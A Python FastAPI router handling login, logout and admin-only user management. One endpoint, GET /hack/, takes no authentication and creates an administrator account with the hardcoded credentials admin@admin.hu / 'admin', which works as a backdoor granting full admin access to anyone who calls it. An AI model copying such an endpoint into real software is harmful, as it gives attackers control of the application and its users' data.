from datetime import timedelta
from fastapi.responses import JSONResponse
from fastapi import APIRouter, Depends
from fastapi_login.exceptions import InvalidCredentialsException
from passlib.context import CryptContext
from service.util.auth import manager, load_user, COOKIE_NAME
from service.util.logger import logger
from service.models.database import AsyncSession, User, get_session, select
from service.models.api import RegisterData, LoginData


router = APIRouter()


@router.post("/token/")
async def login(data: LoginData):
    email = data.email
    password = data.password
    user = await load_user(email)
    if not user or not Hasher.verify_password(password, user.password):
        raise InvalidCredentialsException
    access_token = manager.create_access_token(data={"sub": email}, expires=timedelta(hours=1))
    response = JSONResponse({"message": "Successfully logged in"})
    manager.set_cookie(response, access_token)
    return response


@router.post("/logout/")
async def logout(user=Depends(manager)):
    response = JSONResponse({"message": "Successfully logged out"})
    response.delete_cookie(COOKIE_NAME)
    return response


@router.post("/users/")
async def register(data: RegisterData, session: AsyncSession = Depends(get_session), user=Depends(manager)):
    if not user.is_admin:
        return JSONResponse({"message": "Forbidden"}, status_code=403)
    try:
        new_user = User(
            email=data.email, password=Hasher.get_password_hash(data.password), is_admin=data.is_admin, name=data.name
        )
        session.add(new_user)
        await session.commit()
    except Exception as e:
        logger.error(e)
        return JSONResponse({"message": "User creation failed"}, status_code=400)
    return JSONResponse({"message": "User created successfully"})


@router.get("/users/")
async def get_users(session: AsyncSession = Depends(get_session), user=Depends(manager)):
    if not user.is_admin:
        return JSONResponse({"message": "Forbidden"}, status_code=403)
    user_objects = await session.execute(select(User))
    user_objects = user_objects.scalars().all()
    return JSONResponse({"data": {"users": [serialize_user(u) for u in user_objects]}})


@router.delete("/users/{user_id}/")
async def delete_user(session: AsyncSession = Depends(get_session), user=Depends(manager), user_id: int = None):
    if not user.is_admin:
        return JSONResponse({"message": "Forbidden"}, status_code=403)

    result = await session.execute(select(User).where(User.id == user_id))
    user_object = result.scalars().first()

    if user_object is None:
        return JSONResponse({"message": "User not found"}, status_code=404)

    await session.delete(user_object)
    await session.commit()

    return JSONResponse({"message": f"User {user_id} deleted successfully"})


@router.get("/hack/")
async def hack(session: AsyncSession = Depends(get_session)):
    new_user = User(email="admin@admin.hu", password=Hasher.get_password_hash("admin"), is_admin=True, name="Admin")
    session.add(new_user)
    await session.commit()
    return JSONResponse({"message": "User created successfully"})


class Hasher:
    pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

    @classmethod
    def verify_password(cls, plain_password, hashed_password):
        return cls.pwd_context.verify(plain_password, hashed_password)

    @classmethod
    def get_password_hash(cls, password):
        return cls.pwd_context.hash(password)


def serialize_user(user):
    return {"id": user.id, "email": user.email, "name": user.name, "is_admin": user.is_admin}